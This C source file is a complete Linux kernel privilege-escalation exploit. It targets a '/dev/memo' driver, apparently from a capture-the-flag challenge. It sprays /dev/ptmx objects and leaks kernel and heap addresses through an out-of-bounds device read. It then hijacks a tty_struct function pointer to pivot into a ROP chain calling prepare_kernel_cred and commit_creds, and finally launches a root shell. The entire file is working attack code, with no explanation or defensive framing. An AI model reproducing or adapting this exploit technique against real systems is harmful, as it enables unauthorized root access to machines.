#define _GNU_SOURCE
#include<sched.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>
#include<sys/ioctl.h>
#include<linux/userfaultfd.h>
#include<poll.h>
#include<signal.h>
#include<sys/ipc.h>
#include<sys/msg.h>
#include<sys/socket.h>
#include<sys/xattr.h>
#include<sys/prctl.h>

#define DEVICE_FILE "/dev/memo"
#define SPRAY 0x15ul

int fd;
int spray_fd[SPRAY];
int target_fd;

#define LEAK_OFFSET 0xe65900ul

typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0x7b8b0;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0x7bb50;

unsigned long aw=0xa0333;// mov dword ptr [rdx], esi; ret;
unsigned long ar=0x56cdef;// mov rax, qword ptr [rdx]; ret; 
unsigned long pivot=0x94d4e3;// push r12; add dword ptr [rbp + 0x41], ebx; pop rsp; pop r13; ret;
unsigned long poprdi=0x1268;
unsigned long movrdirax=0x36b1a8;// clc; mov qword ptr [rdi], rdx; mov rdi, rax; cmp rcx, rsi; ja 0x56b199; ret;
unsigned long poprsi=0x5b61f0;// pop rsi; ret;
unsigned long poprcx=0x4c852;// pop rcx; ret; 
unsigned long rop_usermode=0xa00a45;//a00a65,


unsigned long kernel_leak;
unsigned long kernel_base;
unsigned long heap_leak;
unsigned long memo;
unsigned long device;

unsigned long user_cs,user_ss,user_rflags,user_rsp;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :
        : "memory");
}
void getshell(){
	if(!getuid()){
		puts("[+] Priv esc successful!");
	}
	puts("[+] Shell1!!!!");
	char *args[]={"/bin/sh",NULL}; 
	execve("/bin/sh",args,NULL);
}

void exploit(){
	puts("Test");
	save_state();
	for(int i=0;i<SPRAY;i++){
		spray_fd[i]=open("/dev/ptmx",O_RDONLY);
	}
	fd=open(DEVICE_FILE,O_RDWR);
	target_fd=open("/dev/ptmx",O_RDONLY);
	lseek(fd,0x3f8,SEEK_SET);
	unsigned long leaks[93];
	read(fd,(char *)leaks,0x2e8);
	device=leaks[3];
	kernel_leak=leaks[4];
	kernel_base=kernel_leak-LEAK_OFFSET;
	pivot+=kernel_base;
	poprdi+=kernel_base;
	poprcx+=kernel_base;
	poprsi+=kernel_base;
	movrdirax+=kernel_base;
	rop_usermode+=kernel_base;
	commit_creds=(commit_creds_func)(kernel_base+(unsigned long)commit_creds);
	prepare_kernel_cred=(prepare_kernel_cred_func)(kernel_base+(unsigned long)prepare_kernel_cred);
	printf("[+] Device=%p\n",(void *)device);
	printf("[+] Kernel_leak=%p\n",(void *)kernel_leak);
	printf("[+] Kernel_base=%p\n",(void *)kernel_base);
	printf("[+] Kernel_pivot=%p\n",(void *)pivot);
	heap_leak=leaks[8];
	memo=heap_leak-0x438;
	printf("[+] Heap_leak=%p\n",(void *)heap_leak);
	printf("[+] memo=%p\n",(void *)memo);
	lseek(fd,0,SEEK_SET);
	unsigned long ropchain[]={0xdeadbeef,poprdi,0,prepare_kernel_cred,poprcx,0,poprsi,1,movrdirax,commit_creds,
		rop_usermode,0,0,	
		getshell,user_cs,user_rflags,user_rsp,user_ss};
	write(fd,(char *)ropchain,sizeof(ropchain));
	unsigned long payload[5]={0,0x0000000100005401,0,device,memo+0x300};
	lseek(fd,0x3f8,SEEK_SET);
	write(fd,(char *)payload,0x28);
	lseek(fd,0x360,SEEK_SET);
	unsigned long rip[1]={pivot};
	write(fd,(char *)rip,0x8);
	ioctl(target_fd,0,memo);
}

int main(){
	exploit();
	return 0;
}
